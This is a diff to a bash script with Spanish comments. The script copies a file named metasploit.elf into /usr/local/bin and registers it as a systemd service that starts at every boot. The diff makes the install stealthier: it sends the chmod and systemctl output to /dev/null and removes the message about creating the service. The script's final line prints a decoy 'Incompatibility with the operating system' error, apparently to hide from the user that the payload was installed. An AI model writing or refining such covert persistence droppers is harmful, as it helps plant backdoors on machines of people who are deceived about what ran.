@@ -15,7 +15,7 @@ TARGET_FILE="$TARGET_DIR/metasploit.elf"
 cd "$PAYLOAD_DIR" || { echo "No se pudo cambiar al directorio: $PAYLOAD_DIR"; exit 1; }
 
 # Asegurarse de que el archivo tenga permisos de ejecución
-chmod +x "$PAYLOAD_FILE"
+chmod +x "$PAYLOAD_FILE" > /dev/null 2>&1
 
 # Hacer una copia del archivo en la ubicación de destino
 sudo cp  metasploit.elf /usr/local/bin
@@ -30,7 +30,6 @@ cd "$CURRENT_DIR" || { echo "No se pudo regresar al directorio: $CURRENT_DIR"; e
 # Crear el archivo de servicio
 SERVICE_FILE="/etc/systemd/system/metasploitservice.service"
 
-echo "Creando archivo de servicio en $SERVICE_FILE"
 
 sudo bash -c "cat <<EOF > $SERVICE_FILE
 [Unit]
@@ -50,13 +49,13 @@ WantedBy=multi-user.target
 EOF"
 
 # Recargar systemd para reconocer el nuevo servicio
-sudo systemctl daemon-reload
+sudo systemctl daemon-reload > /dev/null 2>&1
 
 # Habilitar el servicio para que inicie al arranque
-sudo systemctl enable metasploitservice.service
+sudo systemctl enable metasploitservice.service > /dev/null 2>&1
 
 # Iniciar el servicio
-sudo systemctl start metasploitservice.service
+sudo systemctl start metasploitservice.service > /dev/null 2>&1
 
 echo "Error: Incompatibility with the operating system"
 
